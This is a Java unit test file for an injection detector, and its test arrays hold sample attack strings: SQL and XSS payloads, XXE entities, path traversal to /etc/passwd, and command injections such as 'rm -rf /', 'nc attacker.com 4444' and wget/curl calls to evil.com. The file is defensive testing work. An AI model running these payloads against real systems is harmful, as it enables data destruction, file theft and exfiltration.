package com.developer.validation;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.DisplayName;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Unit tests for InjectionDetector
 */
class InjectionDetectorTest {
    
    private InjectionDetector detector;
    
    @BeforeEach
    void setUp() {
        detector = new InjectionDetector();
    }
    
    @Test
    @DisplayName("Should detect SQL injection patterns")
    void shouldDetectSqlInjectionPatterns() {
        // Given
        String[] sqlInjectionInputs = {
            "'; DROP TABLE users; --",
            "1' UNION SELECT * FROM passwords",
            "admin'--",
            "1' OR '1'='1",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "SELECT * FROM users WHERE id = 1 AND 1=1",
            "EXEC sp_executesql"
        };
        
        // When & Then
        for (String input : sqlInjectionInputs) {
            assertTrue(detector.detectSqlInjection(input), 
                "Should detect SQL injection in: " + input);
            
            InjectionDetectionResult result = detector.detectInjection(input);
            assertTrue(result.hasThreats());
            assertTrue(result.hasInjectionType(InjectionType.SQL_INJECTION));
        }
    }
    
    @Test
    @DisplayName("Should detect XSS patterns")
    void shouldDetectXssPatterns() {
        // Given
        String[] xssInputs = {
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<div onclick=\"alert('XSS')\">Click me</div>",
            "data:text/html,<script>alert('XSS')</script>",
            "<iframe src=\"javascript:alert('XSS')\"></iframe>",
            "eval('alert(1)')"
        };
        
        // When & Then
        for (String input : xssInputs) {
            assertTrue(detector.detectXss(input), 
                "Should detect XSS in: " + input);
            
            InjectionDetectionResult result = detector.detectInjection(input);
            assertTrue(result.hasThreats());
            assertTrue(result.hasInjectionType(InjectionType.XSS));
        }
    }
    
    @Test
    @DisplayName("Should detect command injection patterns")
    void shouldDetectCommandInjectionPatterns() {
        // Given
        String[] commandInjectionInputs = {
            "test; rm -rf /",
            "file.txt && cat /etc/passwd",
            "input | nc attacker.com 4444",
            "$(whoami)",
            "`id`",
            "test & powershell -c \"Get-Process\"",
            "wget http://evil.com/malware",
            "curl -X POST http://evil.com"
        };
        
        // When & Then
        for (String input : commandInjectionInputs) {
            assertTrue(detector.detectCommandInjection(input), 
                "Should detect command injection in: " + input);
            
            InjectionDetectionResult result = detector.detectInjection(input);
            assertTrue(result.hasThreats());
            assertTrue(result.hasInjectionType(InjectionType.COMMAND_INJECTION));
        }
    }
    
    @Test
    @DisplayName("Should detect path traversal patterns")
    void shouldDetectPathTraversalPatterns() {
        // Given
        String[] pathTraversalInputs = {
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/var/www/../../../etc/passwd",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        };
        
        // When & Then
        for (String input : pathTraversalInputs) {
            assertTrue(detector.detectPathTraversal(input), 
                "Should detect path traversal in: " + input);
            
            InjectionDetectionResult result = detector.detectInjection(input);
            assertTrue(result.hasThreats());
            assertTrue(result.hasInjectionType(InjectionType.PATH_TRAVERSAL));
        }
    }
    
    @Test
    @DisplayName("Should detect LDAP injection patterns")
    void shouldDetectLdapInjectionPatterns() {
        // Given
        String[] ldapInjectionInputs = {
            "admin)(|(password=*))",
            "*)(&(objectClass=user)",
            "cn=*)(uid=*",
            "(|(cn=*)(mail=*))"
        };
        
        // When & Then
        for (String input : ldapInjectionInputs) {
            assertTrue(detector.detectLdapInjection(input), 
                "Should detect LDAP injection in: " + input);
            
            InjectionDetectionResult result = detector.detectInjection(input);
            assertTrue(result.hasThreats());
            assertTrue(result.hasInjectionType(InjectionType.LDAP_INJECTION));
        }
    }
    
    @Test
    @DisplayName("Should detect XML injection patterns")
    void shouldDetectXmlInjectionPatterns() {
        // Given
        String[] xmlInjectionInputs = {
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
            "<![CDATA[<script>alert('XSS')</script>]]>",
            "<!ENTITY xxe SYSTEM \"http://evil.com/malicious.dtd\">",
            "<?xml version=\"1.0\"?>"
        };
        
        // When & Then
        for (String input : xmlInjectionInputs) {
            assertTrue(detector.detectXmlInjection(input), 
                "Should detect XML injection in: " + input);
            
            InjectionDetectionResult result = detector.detectInjection(input);
            assertTrue(result.hasThreats());
            assertTrue(result.hasInjectionType(InjectionType.XML_INJECTION));
        }
    }
    
    @Test
    @DisplayName("Should handle safe input correctly")
    void shouldHandleSafeInputCorrectly() {
        // Given
        String[] safeInputs = {
            "Hello World",
            "user@example.com",
            "123-456-7890",
            "Normal text with spaces and numbers 123",
            "Safe filename.txt"
        };
        
        // When & Then
        for (String input : safeInputs) {
            assertFalse(detector.detectSqlInjection(input), 
                "Should not detect SQL injection in safe input: " + input);
            assertFalse(detector.detectXss(input), 
                "Should not detect XSS in safe input: " + input);
            assertFalse(detector.detectCommandInjection(input), 
                "Should not detect command injection in safe input: " + input);
            assertFalse(detector.detectPathTraversal(input), 
                "Should not detect path traversal in safe input: " + input);
            assertFalse(detector.detectLdapInjection(input), 
                "Should not detect LDAP injection in safe input: " + input);
            assertFalse(detector.detectXmlInjection(input), 
                "Should not detect XML injection in safe input: " + input);
            
            InjectionDetectionResult result = detector.detectInjection(input);
            assertTrue(result.isSafe());
            assertFalse(result.hasThreats());
            assertEquals(0, result.getThreatCount());
        }
    }
    
    @Test
    @DisplayName("Should handle null and empty input safely")
    void shouldHandleNullAndEmptyInputSafely() {
        // Test null input
        InjectionDetectionResult nullResult = detector.detectInjection(null);
        assertTrue(nullResult.isSafe());
        assertFalse(nullResult.hasThreats());
        
        // Test empty input
        InjectionDetectionResult emptyResult = detector.detectInjection("");
        assertTrue(emptyResult.isSafe());
        assertFalse(emptyResult.hasThreats());
        
        // Test whitespace input
        InjectionDetectionResult whitespaceResult = detector.detectInjection("   ");
        assertTrue(whitespaceResult.isSafe());
        assertFalse(whitespaceResult.hasThreats());
    }
    
    @Test
    @DisplayName("Should detect multiple injection types in single input")
    void shouldDetectMultipleInjectionTypesInSingleInput() {
        // Given - input that contains both SQL injection and XSS
        String multiThreatInput = "'; DROP TABLE users; --<script>alert('XSS')</script>";
        
        // When
        InjectionDetectionResult result = detector.detectInjection(multiThreatInput);
        
        // Then
        assertTrue(result.hasThreats());
        assertTrue(result.getThreatCount() >= 2);
        assertTrue(result.hasInjectionType(InjectionType.SQL_INJECTION));
        assertTrue(result.hasInjectionType(InjectionType.XSS));
    }
    
    @Test
    @DisplayName("Should provide threat summary")
    void shouldProvideThreatSummary() {
        // Given
        String threatInput = "'; DROP TABLE users; --";
        
        // When
        InjectionDetectionResult result = detector.detectInjection(threatInput);
        String summary = result.getThreatSummary();
        
        // Then
        assertNotNull(summary);
        assertTrue(summary.contains("threat"));
        assertTrue(summary.contains("SQL"));
    }
}